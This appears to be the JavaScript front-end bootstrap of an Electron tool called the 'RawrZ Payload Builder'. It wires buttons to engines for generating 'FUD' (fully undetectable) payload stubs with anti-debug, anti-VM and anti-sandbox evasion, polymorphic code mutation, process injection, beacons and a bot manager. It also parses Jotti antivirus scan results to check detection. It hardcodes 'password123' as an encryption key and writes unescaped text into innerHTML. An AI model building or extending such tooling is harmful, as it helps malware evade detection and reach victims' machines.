// ═════════════════════════════════════════════════════════════════════════════
// RAWRZ RENDERER BOOTSTRAP — bridges window.electronAPI to legacy APIs
// Must be loaded AFTER preload.js (which provides window.electronAPI)
// ═════════════════════════════════════════════════════════════════════════════

(function () {
  'use strict';

  // ── 1. Validate preload is present ─────────────────────────────────────
  if (typeof window === 'undefined') {
    console.error('[RawrZ Bootstrap] No window object');
    return;
  }

  if (!window.electronAPI) {
    console.error('[RawrZ Bootstrap] window.electronAPI is MISSING — preload not loaded?');
    // Create a minimal fallback so the app doesn't crash
    window.electronAPI = {
      selectFile: async () => null,
      selectFiles: async () => [],
      selectDirectory: async () => null,
      executeEngine: async (id, params) => ({ success: false, message: 'No IPC' }),
      generateStub: async () => ({ success: false, message: 'No IPC' }),
      getStubStatus: async () => ({ error: 'No IPC' }),
      burnStub: async () => ({ error: 'No IPC' }),
      encryptFile: async () => ({ success: false, error: 'No IPC' }),
      decryptFile: async () => ({ success: false, error: 'No IPC' }),
      hashFile: async () => ({ success: false, error: 'No IPC' }),
      getEngines: async () => [],
      getEngineConfig: async () => null,
      on: () => {},
      removeAllListeners: () => {},
    };
  }

  console.log('[RawrZ Bootstrap] Preload validated, setting up legacy APIs...');

  // ── 2. Create window.rawrz alias ─────────────────────────────────────────
  window.rawrz = window.electronAPI;

  // ── 3. Engine Configs registry ───────────────────────────────────────────
  window.engineConfigs = {
    'stub-generator': {
      id: 'stub-generator',
      name: 'FUD Stub Generator',
      enabled: true,
      languages: ['cpp', 'csharp', 'python', 'powershell', 'java', 'go', 'rust', 'javascript', 'asm', 'advanced'],
      encryption: ['aes-256-gcm', 'aes-256-cbc', 'chacha20', 'hybrid', 'triple'],
      antiAnalysis: ['anti-debug', 'anti-vm', 'anti-sandbox', 'sleep-evasion']
    },
    'polymorphic': {
      id: 'polymorphic',
      name: 'Polymorphic Engine',
      enabled: true,
      mutations: ['instruction-substitution', 'register-reallocation', 'control-flow-flattening', 'opaque-predicates']
    },
    'anti-analysis': {
      id: 'anti-analysis',
      name: 'Anti-Analysis Engine',
      enabled: true,
      techniques: ['vm-detection', 'debugger-detection', 'sandbox-detection', 'timing-attacks']
    },
    'beacon': {
      id: 'beacon',
      name: 'Beacon Engine',
      enabled: false,
      protocols: ['http', 'https', 'dns', 'icmp']
    },
    'omega': {
      id: 'omega',
      name: 'Omega Generator',
      enabled: false,
      modes: ['stealth', 'aggressive', 'persistent']
    },
    'win32': {
      id: 'win32',
      name: 'Win32 Operations',
      enabled: true,
      operations: ['process-injection', 'api-hooking', 'memory-manipulation']
    },
    'cve-scanner': {
      id: 'cve-scanner',
      name: 'CVE Scanner',
      enabled: false,
      databases: ['nvd', 'cvedetails', 'exploitdb']
    },
    'bot-manager': {
      id: 'bot-manager',
      name: 'Bot Manager',
      enabled: false,
      types: ['irc', 'http', 'tcp', 'udp']
    }
  };

  // ── 4. generateEngineMenu function ─────────────────────────────────────
  window.generateEngineMenu = async function (engineId) {
    try {
      const menu = await window.electronAPI.executeEngine('generate-engine-menu', { engineId });
      return menu;
    } catch (e) {
      console.error('[generateEngineMenu] Error:', e);
      // Fallback
      const config = window.engineConfigs[engineId];
      if (!config) return null;
      return {
        id: engineId,
        name: config.name,
        items: [
          { label: 'Configure', action: 'configure' },
          { label: 'Run', action: 'run' },
          { label: 'Stop', action: 'stop' },
          { label: 'Status', action: 'status' }
        ]
      };
    }
  };

  // ── 5. Stub management functions (used by HTML onclick handlers) ──────────
  window.generateStubs = async function () {
    log('🏗️ Generating FUD stubs...');
    try {
      const result = await window.electronAPI.executeEngine('stub-generator', { action: 'generate' });
      if (result.success) {
        log('✅ Stubs generated: ' + (result.data?.stubId || 'OK'));
        updateStubStatus();
      } else {
        log('❌ Error generating stubs: ' + result.message);
      }
    } catch (e) {
      log('❌ Error generating stubs: ' + e.message);
    }
  };

  window.useStub = async function () {
    log('🔥 Using next available stub...');
    try {
      const result = await window.electronAPI.executeEngine('stub-generator', { action: 'use-next' });
      if (result.success) {
        log('✅ Stub used: ' + (result.data?.stubId || 'OK'));
        updateStubStatus();
      } else {
        log('❌ Error using stub: ' + result.message);
      }
    } catch (e) {
      log('❌ Error using stub: ' + e.message);
    }
  };

  window.burnCurrentStub = async function () {
    log('🔥 Burning current stub...');
    try {
      const result = await window.electronAPI.executeEngine('stub-generator', { action: 'burn' });
      if (result.success) {
        log('✅ Stub burned');
        updateStubStatus();
      } else {
        log('❌ Error burning stub: ' + result.message);
      }
    } catch (e) {
      log('❌ Error burning stub: ' + e.message);
    }
  };

  window.checkStubStatus = async function () {
    log('🔄 Checking stub status...');
    try {
      const result = await window.electronAPI.executeEngine('stub-generator', { action: 'status' });
      if (result.success) {
        const status = result.data || {};
        log(`📊 Stubs: ${status.total || 0} total, ${status.active || 0} active, ${status.burned || 0} burned`);
        const el = document.getElementById('stubStatus');
        if (el) el.textContent = `Stubs: ${status.active || 0} Active | ${status.burned || 0} Burned`;
      } else {
        log('❌ Error checking stub status: ' + result.message);
      }
    } catch (e) {
      log('❌ Error checking stub status: ' + e.message);
    }
  };

  function updateStubStatus() {
    // Triggered after stub operations
    checkStubStatus();
  }

  // ── 6. Engine control functions ──────────────────────────────────────────
  window.runPolymorphicEngine = async function () {
    log('🔄 Running polymorphic engine...');
    try {
      const result = await window.electronAPI.executeEngine('polymorphic', { action: 'run' });
      log(result.success ? '✅ Polymorphic engine executed' : '❌ Polymorphic engine error: ' + result.message);
    } catch (e) {
      log('❌ Polymorphic engine error: ' + e.message);
    }
  };

  window.mutateCode = async function () {
    log('🧬 Mutating code structure...');
    try {
      const result = await window.electronAPI.executeEngine('polymorphic', { action: 'mutate' });
      log(result.success ? '✅ Code mutation complete' : '❌ Code mutation error: ' + result.message);
    } catch (e) {
      log('❌ Code mutation error: ' + e.message);
    }
  };

  window.enableAntiAnalysis = async function () {
    log('🛡️ Enabling anti-analysis protection...');
    try {
      const result = await window.electronAPI.executeEngine('anti-analysis', { action: 'enable' });
      log(result.success ? '✅ Anti-analysis protection enabled' : '❌ Anti-analysis error: ' + result.message);
    } catch (e) {
      log('❌ Anti-analysis error: ' + e.message);
    }
  };

  window.testAntiAnalysis = async function () {
    log('🧪 Testing anti-analysis protection...');
    try {
      const result = await window.electronAPI.executeEngine('anti-analysis', { action: 'test' });
      log(result.success ? '✅ Protection test passed' : '❌ Protection test error: ' + result.message);
    } catch (e) {
      log('❌ Protection test error: ' + e.message);
    }
  };

  window.showEngineMenu = async function (engineId) {
    log(`🔧 Showing menu for ${engineId}...`);
    try {
      const menu = await window.generateEngineMenu(engineId);
      if (menu) {
        log(`📋 ${menu.name} menu:`);
        menu.items.forEach(item => log(`  • ${item.label}`));
      }
    } catch (e) {
      log('❌ Menu generation error: ' + e.message);
    }
  };

  // ── 7. File operation helpers ────────────────────────────────────────────
  window.selectPayloadFile = async function () {
    try {
      const filePath = await window.electronAPI.selectFile();
      if (filePath) {
        const el = document.getElementById('stubPayloadPath');
        if (el) el.value = filePath;
        log('📁 Selected: ' + filePath);
      } else {
        log('No file selected');
      }
      return filePath;
    } catch (e) {
      log('❌ File selection error: ' + e.message);
      return null;
    }
  };

  window.selectOutputPath = async function () {
    try {
      const filePath = await window.electronAPI.showSaveDialog({
        defaultPath: 'stub_output',
        filters: [{ name: 'All Files', extensions: ['*'] }]
      });
      if (filePath) {
        const el = document.getElementById('stubOutputPath');
        if (el) el.value = filePath;
        log('💾 Output: ' + filePath);
      }
      return filePath;
    } catch (e) {
      log('❌ Save dialog error: ' + e.message);
      return null;
    }
  };

  // ── 8. Logging helper ────────────────────────────────────────────────────
  window.log = function (msg) {
    const output = document.getElementById('output');
    if (!output) {
      console.log('[RawrZ]', msg);
      return;
    }
    const ts = new Date().toLocaleTimeString();
    output.textContent += `[${ts}] ${msg}\n`;
    output.scrollTop = output.scrollHeight;
  };

  // ── 9. Event listeners for UI buttons ──────────────────────────────────
  document.addEventListener('DOMContentLoaded', function () {
    console.log('[RawrZ Bootstrap] DOM ready, binding controls...');

    // File buttons
    bindClick('selectFile', () => window.electronAPI.selectFile().then(p => log(p ? '📁 ' + p : 'No file selected')));
    bindClick('selectFiles', () => window.electronAPI.selectFiles().then(p => log(p?.length ? `📁 ${p.length} files` : 'No files selected')));
    bindClick('selectDir', () => window.electronAPI.selectDirectory().then(p => log(p ? '📁 ' + p : 'No directory selected')));

    // Stub generator buttons
    bindClick('browsePayload', window.selectPayloadFile);
    bindClick('browseOutput', window.selectOutputPath);
    bindClick('generateStub', async () => {
      const payloadPath = document.getElementById('stubPayloadPath')?.value;
      const outputPath = document.getElementById('stubOutputPath')?.value;
      const stubType = document.getElementById('stubType')?.value || 'cpp';
      const encryption = document.getElementById('stubEncryption')?.value || 'aes-256-cbc';

      if (!payloadPath) {
        log('❌ No payload file selected');
        return;
      }

      log('🔨 Generating stub...');
      try {
        const result = await window.electronAPI.generateStub(payloadPath, {
          stubType,
          encryption,
          outputPath,
          antiDebug: document.getElementById('antiDebug')?.checked,
          antiVM: document.getElementById('antiVM')?.checked,
          antiSandbox: document.getElementById('antiSandbox')?.checked
        });
        if (result.success) {
          log(`✅ Stub generated: ${result.outputPath}`);
          log(`   Size: ${result.payloadSize} bytes → ${result.encryptedSize} bytes encrypted`);
          log(`   Duration: ${result.duration}ms`);
        } else {
          log('❌ Stub generation failed: ' + (result.error || 'Unknown error'));
        }
      } catch (e) {
        log('❌ Stub generation error: ' + e.message);
      }
    });
    bindClick('clearStubConfig', () => {
      const ids = ['stubPayloadPath', 'stubOutputPath'];
      ids.forEach(id => { const el = document.getElementById(id); if (el) el.value = ''; });
      log('🧹 Stub config cleared');
    });

    // Security tool buttons
    bindClick('hashBtn', async () => {
      const file = await window.electronAPI.selectFile();
      if (!file) { log('❌ No file selected'); return; }
      const result = await window.electronAPI.hashFile(file);
      log(result.success ? `🔐 Hash: ${result.hash}` : '❌ Hash failed: ' + result.error);
    });
    bindClick('compressBtn', async () => {
      const file = await window.electronAPI.selectFile();
      if (!file) { log('❌ No file selected'); return; }
      const result = await window.electronAPI.compressFile(file);
      log(result.success ? `📦 Compressed: ${result.originalSize} → ${result.compressedSize}` : '❌ Compress failed: ' + result.error);
    });
    bindClick('decompressBtn', async () => {
      const file = await window.electronAPI.selectFile();
      if (!file) { log('❌ No file selected'); return; }
      const result = await window.electronAPI.decompressFile(file);
      log(result.success ? `📦 Decompressed: ${result.path}` : '❌ Decompress failed: ' + result.error);
    });
    bindClick('createArchiveBtn', async () => {
      const files = await window.electronAPI.selectFiles();
      if (!files?.length) { log('❌ No files selected'); return; }
      const result = await window.electronAPI.createArchive(files);
      log(result.success ? `📦 Archive created: ${result.path}` : '❌ Archive failed: ' + result.error);
    });
    bindClick('extractArchiveBtn', async () => {
      const file = await window.electronAPI.selectFile();
      if (!file) { log('❌ No file selected'); return; }
      const result = await window.electronAPI.extractArchive(file);
      log(result.success ? `📦 Extracted: ${result.path}` : '❌ Extract failed: ' + result.error);
    });
    bindClick('encryptFileBtn', async () => {
      const file = await window.electronAPI.selectFile();
      if (!file) { log('❌ No file selected for encryption'); return; }
      const result = await window.electronAPI.encryptFile(file, 'aes-256-cbc', 'password123');
      log(result.success ? `🔐 Encrypted: ${result.path}` : '❌ Encrypt failed: ' + result.error);
    });
    bindClick('decryptFileBtn', async () => {
      const file = await window.electronAPI.selectFile();
      if (!file) { log('❌ No file selected for decryption'); return; }
      const result = await window.electronAPI.decryptFile(file, 'aes-256-cbc', 'password123');
      log(result.success ? `🔓 Decrypted: ${result.path}` : '❌ Decrypt failed: ' + result.error);
    });

    // Output controls
    bindClick('clearOutput', () => {
      const el = document.getElementById('output');
      if (el) el.textContent = '';
    });
    bindClick('saveOutput', () => {
      const el = document.getElementById('output');
      if (!el) return;
      const blob = new Blob([el.textContent], { type: 'text/plain' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = `rawrz-log-${Date.now()}.txt`;
      a.click();
      log('💾 Log saved');
    });

    // Jotti parser
    bindClick('parseJottiBtn', () => {
      const input = document.getElementById('jottiInput');
      const results = document.getElementById('jottiResults');
      if (!input || !results) return;
      const text = input.value;
      if (!text.trim()) { log('❌ No Jotti results to parse'); return; }
      // Simple parsing
      const lines = text.split('\n').filter(l => l.trim());
      let html = '<h5>Scan Results</h5>';
      lines.forEach(line => {
        const clean = line.trim();
        if (clean.includes('detected') || clean.includes('found')) {
          html += `<div class="jotti-detect">⚠️ ${clean}</div>`;
        } else if (clean.includes('clean') || clean.includes('ok')) {
          html += `<div class="jotti-clean">✅ ${clean}</div>`;
        } else {
          html += `<div class="jotti-info">ℹ️ ${clean}</div>`;
        }
      });
      results.innerHTML = html;
      log('🔍 Jotti results parsed');
    });
    bindClick('clearJottiBtn', () => {
      const input = document.getElementById('jottiInput');
      const results = document.getElementById('jottiResults');
      if (input) input.value = '';
      if (results) results.innerHTML = '';
    });

    // Tab switching
    document.querySelectorAll('.tab').forEach(tab => {
      tab.addEventListener('click', () => {
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        tab.classList.add('active');
        const target = document.getElementById(tab.dataset.tab);
        if (target) target.classList.add('active');
      });
    });

    // Engine toggles initialization
    initEngineToggles();

    // Initial stub status
    checkStubStatus();

    log('🔧 Engine Manager initialized with auto-generated menus');
    log('✅ RawrZ Payload Builder ready');
  });

  function bindClick(id, handler) {
    const el = document.getElementById(id);
    if (el) {
      el.addEventListener('click', handler);
      console.log(`[RawrZ Bootstrap] Bound #${id}`);
    } else {
      console.warn(`[RawrZ Bootstrap] Element #${id} not found`);
    }
  }

  async function initEngineToggles() {
    const container = document.getElementById('engineToggles');
    if (!container) return;
    try {
      const engines = await window.electronAPI.getEngines();
      container.innerHTML = engines.map(e => `
        <div class="engine-toggle">
          <label>
            <input type="checkbox" ${e.enabled ? 'checked' : ''} data-engine="${e.id}">
            ${e.name}
          </label>
        </div>
      `).join('');

      container.querySelectorAll('input[type="checkbox"]').forEach(cb => {
        cb.addEventListener('change', async () => {
          const engineId = cb.dataset.engine;
          const enabled = cb.checked;
          log(`${enabled ? '✅' : '❌'} ${engineId} ${enabled ? 'enabled' : 'disabled'}`);
        });
      });
    } catch (e) {
      console.error('Engine toggles init failed:', e);
    }
  }

  console.log('[RawrZ Bootstrap] ✅ All legacy APIs initialized');
})();
